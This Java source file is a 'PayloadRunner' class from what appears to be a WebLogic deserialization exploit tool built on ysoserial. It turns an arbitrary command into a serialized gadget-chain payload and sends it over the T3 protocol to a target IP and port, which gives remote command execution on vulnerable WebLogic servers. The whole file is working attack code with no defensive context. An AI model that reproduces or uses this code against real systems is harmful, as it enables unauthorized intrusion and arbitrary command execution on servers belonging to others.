package unserWeblogic.utils;

import unserWeblogic.T3.T3;
import unserWeblogic.gadgets.ObjectPayload;
import ysoserial.Serializer;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.util.Arrays;
import java.util.concurrent.Callable;

public class PayloadRunner {
    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String ip, final String port, final String protocol, final String payloadType, final String payload) throws Exception {
        // ensure payload generation doesn't throw an exception
        if(payloadType.equals("cmd")){
            cmdExec(clazz, ip, port, protocol, payload);
        }
    }

    static void cmdExec(final Class<? extends ObjectPayload<?>> clazz, final String ip, final String port, final String protocol, final String command) throws Exception {
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
            public byte[] call() throws Exception {

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                ObjectPayload.Utils.releasePayload(payload, objBefore);
                return ser;
            }});

        try {
            System.out.println(Arrays.toString(serialized));
            if(protocol.equals("T3")){
                T3.send(ip, port, serialized);
            }
//            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
